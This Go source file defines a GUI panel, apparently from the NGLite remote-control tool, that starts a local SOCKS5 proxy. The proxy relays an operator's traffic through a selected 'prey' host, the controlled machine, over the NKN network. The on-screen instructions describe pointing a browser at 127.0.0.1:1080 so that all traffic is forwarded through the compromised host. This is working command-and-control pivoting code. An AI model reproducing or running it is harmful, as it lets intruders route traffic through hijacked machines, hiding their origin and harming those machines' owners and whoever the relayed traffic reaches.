package widgets

import (
	"NGLite/internal/core"
	"NGLite/internal/transport"
	"NGLite/module/proxy"
	"fmt"
	"strconv"
	"sync"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/widget"
	nkn "github.com/nknorg/nkn-sdk-go"
)

type ProxyPanel struct {
	sessionManager *core.SessionManager
	transportMgr   *transport.TransportManager
	
	selectedSession *core.Session
	proxyServer     *proxy.Socks5Server
	nknClient       *nkn.MultiClient
	
	portEntry       *widget.Entry
	statusLabel     *widget.Label
	startButton     *widget.Button
	stopButton      *widget.Button
	logText         binding.String
	logWidget       *widget.Entry
	
	mu              sync.Mutex
}

func NewProxyPanel(sm *core.SessionManager, tm *transport.TransportManager) *ProxyPanel {
	p := &ProxyPanel{
		sessionManager: sm,
		transportMgr:   tm,
		logText:        binding.NewString(),
	}
	
	return p
}

func (p *ProxyPanel) Build() fyne.CanvasObject {
	p.portEntry = widget.NewEntry()
	p.portEntry.SetPlaceHolder("本地端口（如：1080）")
	p.portEntry.SetText("1080")
	
	p.statusLabel = widget.NewLabel("状态: 未运行")
	
	p.startButton = widget.NewButton("启动代理", p.onStart)
	p.stopButton = widget.NewButton("停止代理", p.onStop)
	p.stopButton.Disable()
	
	p.logWidget = widget.NewMultiLineEntry()
	p.logWidget.Wrapping = fyne.TextWrapWord
	p.logWidget.Disable()
	p.logWidget.Bind(p.logText)
	
	infoLabel := widget.NewLabel("SOCKS5 代理功能说明：")
	infoText := widget.NewLabel(
		"1. 选择一个在线的被控端会话\n" +
		"2. 设置本地监听端口（默认 1080）\n" +
		"3. 点击「启动代理」开始服务\n" +
		"4. 在浏览器或应用中配置 SOCKS5 代理:\n" +
		"   地址: 127.0.0.1\n" +
		"   端口: 1080\n" +
		"5. 所有流量将通过被控端转发",
	)
	infoText.Wrapping = fyne.TextWrapWord
	
	// 配置区域：固定高度的配置表单
	configBox := container.NewVBox(
		widget.NewLabel("本地端口:"),
		p.portEntry,
		container.NewHBox(
			p.startButton,
			p.stopButton,
		),
		widget.NewSeparator(),
		p.statusLabel,
	)
	
	// 说明信息区域：固定高度
	infoBox := container.NewVBox(
		infoLabel,
		infoText,
		widget.NewSeparator(),
	)
	
	// 日志区域使用Scroll确保可滚动，自适应剩余空间
	logScroll := container.NewScroll(p.logWidget)
	logBox := container.NewBorder(
		widget.NewLabel("代理日志:"),
		nil,
		nil,
		nil,
		logScroll,
	)
	
	// 整体布局：顶部固定说明和配置，底部日志区域自适应
	mainBox := container.NewBorder(
		container.NewVBox(infoBox, configBox, widget.NewSeparator()),
		nil,
		nil,
		nil,
		logBox,
	)
	
	return mainBox
}

func (p *ProxyPanel) SetSelectedSession(session *core.Session) {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	p.selectedSession = session
	
	if p.proxyServer != nil && p.proxyServer.IsRunning() {
		p.log("警告: 切换会话将停止当前代理")
	}
}

func (p *ProxyPanel) onStart() {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	if p.selectedSession == nil {
		p.log("错误: 请先选择一个在线会话")
		return
	}
	
	if p.proxyServer != nil && p.proxyServer.IsRunning() {
		p.log("错误: 代理服务器已在运行")
		return
	}
	
	portStr := p.portEntry.Text
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		p.log("错误: 端口号无效，请输入 1-65535 之间的数字")
		return
	}
	
	p.log(fmt.Sprintf("正在启动 SOCKS5 代理服务器 (端口: %d)...", port))
	p.log(fmt.Sprintf("目标被控端: %s", p.selectedSession.PreyID))
	
	nknClient, err := p.transportMgr.CreateRandomClient()
	if err != nil {
		p.log(fmt.Sprintf("错误: 无法创建 NKN 客户端: %v", err))
		return
	}
	
	p.nknClient = nknClient
	p.proxyServer = proxy.NewSocks5Server(port, p.selectedSession.PreyID, nknClient, p.log)
	
	go func() {
		if err := p.proxyServer.Start(); err != nil {
			p.log(fmt.Sprintf("错误: 启动失败: %v", err))
			p.mu.Lock()
			p.proxyServer = nil
			p.mu.Unlock()
			return
		}
		
		p.updateUI(true)
		p.log("✓ SOCKS5 代理服务器已启动")
		p.log(fmt.Sprintf("配置你的应用使用代理: 127.0.0.1:%d", port))
	}()
}

func (p *ProxyPanel) onStop() {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	if p.proxyServer == nil || !p.proxyServer.IsRunning() {
		p.log("错误: 代理服务器未运行")
		return
	}
	
	p.log("正在停止代理服务器...")
	
	if err := p.proxyServer.Stop(); err != nil {
		p.log(fmt.Sprintf("错误: 停止失败: %v", err))
		return
	}
	
	if p.nknClient != nil {
		p.nknClient.Close()
		p.nknClient = nil
	}
	
	p.proxyServer = nil
	p.updateUI(false)
	p.log("✓ 代理服务器已停止")
}

func (p *ProxyPanel) updateUI(running bool) {
	if running {
		p.statusLabel.SetText("状态: ● 运行中")
		p.startButton.Disable()
		p.stopButton.Enable()
		p.portEntry.Disable()
	} else {
		p.statusLabel.SetText("状态: 未运行")
		p.startButton.Enable()
		p.stopButton.Disable()
		p.portEntry.Enable()
	}
}

func (p *ProxyPanel) log(msg string) {
	timestamp := time.Now().Format("15:04:05")
	logMsg := fmt.Sprintf("[%s] %s\n", timestamp, msg)
	
	currentLog, _ := p.logText.Get()
	p.logText.Set(currentLog + logMsg)
}

func (p *ProxyPanel) Cleanup() {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	if p.proxyServer != nil && p.proxyServer.IsRunning() {
		p.proxyServer.Stop()
		p.proxyServer = nil
	}
	
	if p.nknClient != nil {
		p.nknClient.Close()
		p.nknClient = nil
	}
}

